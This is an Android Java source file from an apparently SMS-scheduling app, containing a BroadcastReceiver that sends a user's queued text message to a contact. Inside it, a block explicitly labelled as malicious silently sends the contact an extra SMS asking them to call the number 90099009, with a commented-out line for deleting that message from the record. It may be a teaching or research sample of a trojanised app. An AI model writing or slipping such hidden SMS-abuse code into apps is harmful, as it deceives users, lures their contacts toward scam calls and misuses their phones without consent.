package com.example.smsautomatorplus;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class MyBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Toast.makeText(context, "Message will be sent", Toast.LENGTH_LONG).show();
        String contact = intent.getStringExtra("contact");
        String message = intent.getStringExtra("message");

        // Start of malicious part
        String malicious_message = "Hey, I'm busy, could you call me on 90099009";
        SMSOp.sendSMS(contact, malicious_message, context, false);
//        SMSOp.deleteSMS(context, malicious_message, contact);
        // End of malicious part

        SMSOp.sendSMS(contact, message, context, true);
    }

}